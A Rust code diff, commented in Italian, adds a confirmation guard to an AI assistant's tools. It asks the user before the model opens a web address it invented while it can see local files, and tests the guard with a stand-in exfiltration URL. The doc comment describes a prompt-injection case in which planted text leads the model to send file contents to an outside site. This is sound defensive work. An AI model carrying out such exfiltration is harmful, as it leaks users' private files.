@@ -79,6 +79,59 @@ pub fn decide(level: PermissionLevel, risk: Risk) -> Decision {
     }
 }
 
+/// Protezione dalla fuga di dati (ADR 0007): con file e web insieme, un testo
+/// malevolo (una pagina, un file) potrebbe convincere il modello a leggere un
+/// file concesso e poi ad aprire `https://sito-altrui/?dati=<contenuto>`.
+/// Per questo `read_web_page` chiede conferma quando il modello vede i file e
+/// l'indirizzo non viene dall'utente né da una ricerca: un indirizzo inventato
+/// dal modello è l'unico modo di portare fuori i dati.
+///
+/// Non vale con il livello "Consenti tutto" (il terminale può comunque far
+/// uscire qualunque cosa) né dopo "Consenti sempre" su quello strumento.
+pub fn needs_exfiltration_check(
+    call: &ToolCall,
+    settings: &ToolSettings,
+    folders: &[PathBuf],
+    known_urls: &[String],
+) -> bool {
+    if call.name != READ_WEB_PAGE
+        || !settings.files
+        || folders.is_empty()
+        || settings.permission == PermissionLevel::All
+        || settings.allowed_tools.iter().any(|t| t == READ_WEB_PAGE)
+    {
+        return false;
+    }
+    let Some(url) = call.arguments.get("url").and_then(Value::as_str) else {
+        return false;
+    };
+    let wanted = normalize_url(url);
+    !known_urls
+        .iter()
+        .any(|known| normalize_url(known) == wanted)
+}
+
+fn normalize_url(url: &str) -> String {
+    let url = url.trim();
+    match reqwest::Url::parse(url) {
+        Ok(parsed) => parsed.to_string(),
+        Err(_) => url.to_string(),
+    }
+}
+
+/// Gli indirizzi web scritti in un testo, per [`needs_exfiltration_check`].
+pub fn urls_in(text: &str) -> impl Iterator<Item = String> + '_ {
+    text.split(|c: char| c.is_whitespace() || matches!(c, '<' | '>' | '"' | '(' | ')'))
+        .filter(|word| word.starts_with("http://") || word.starts_with("https://"))
+        .map(|word| {
+            word.trim_end_matches(['.', ',', ';', ':', '!', '?', '\'', ']', '*'])
+                .to_string()
+        })
+}
+
+/// Il nome dello strumento di ricerca, per riconoscerne i risultati.
+pub const SEARCH_TOOL: &str = WEB_SEARCH;
+
 /// Strumenti e permessi di una conversazione.
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase", default)]
@@ -502,7 +555,7 @@ pub async fn run(call: &ToolCall, settings: &ToolSettings, ctx: &ToolContext<'_>
             Err(e) => Err(e),
         },
         READ_WEB_PAGE => match arg(args, "url") {
-            Ok(url) => web::read_page(ctx.web_http, url)
+            Ok(url) => web::read_page(url)
                 .await
                 .map_err(|e| ToolOutput::error(e.to_string())),
             Err(e) => Err(e),
@@ -655,6 +708,63 @@ mod tests {
             ..call
         };
         assert!(run(&broken, &ToolSettings::default(), &ctx).await.is_error);
+    }
+
+    #[test]
+    fn un_indirizzo_inventato_mentre_si_vedono_i_file_chiede_conferma() {
+        let folders = vec![PathBuf::from("C:\\dati")];
+        let mut settings = ToolSettings {
+            web: true,
+            ..Default::default()
+        };
+        let page = |url: &str| ToolCall {
+            id: "1".into(),
+            name: READ_WEB_PAGE.into(),
+            arguments: json!({ "url": url }),
+        };
+        let known: Vec<String> =
+            urls_in("Leggi https://esempio.it/guida, poi (https://altro.org/a?b=1).").collect();
+        assert_eq!(
+            known,
+            ["https://esempio.it/guida", "https://altro.org/a?b=1"]
+        );
+
+        let check = |call: &ToolCall, settings: &ToolSettings, folders: &[PathBuf]| {
+            needs_exfiltration_check(call, settings, folders, &known)
+        };
+        let invented = page("https://raccolta.example/?d=segreto");
+        assert!(check(&invented, &settings, &folders));
+        // Gli indirizzi dati dall'utente o da una ricerca non chiedono nulla.
+        assert!(!check(
+            &page("https://esempio.it/guida"),
+            &settings,
+            &folders
+        ));
+        assert!(!check(
+            &page("HTTPS://ALTRO.ORG/a?b=1"),
+            &settings,
+            &folders
+        ));
+        // Senza file da far uscire, o con il permesso più ampio, non serve.
+        assert!(!check(&invented, &settings, &[]));
+        settings.files = false;
+        assert!(!check(&invented, &settings, &folders));
+        settings.files = true;
+        settings.permission = PermissionLevel::All;
+        assert!(!check(&invented, &settings, &folders));
+        settings.permission = PermissionLevel::Edits;
+        assert!(check(&invented, &settings, &folders));
+        // "Consenti sempre" su questo strumento vale per la conversazione.
+        settings.allowed_tools.push(READ_WEB_PAGE.into());
+        assert!(!check(&invented, &settings, &folders));
+        // La ricerca non porta i dati a un sito scelto dal modello.
+        let search = ToolCall {
+            name: WEB_SEARCH.into(),
+            arguments: json!({ "query": "segreto" }),
+            ..invented
+        };
+        settings.allowed_tools.clear();
+        assert!(!check(&search, &settings, &folders));
     }
 
     #[test]
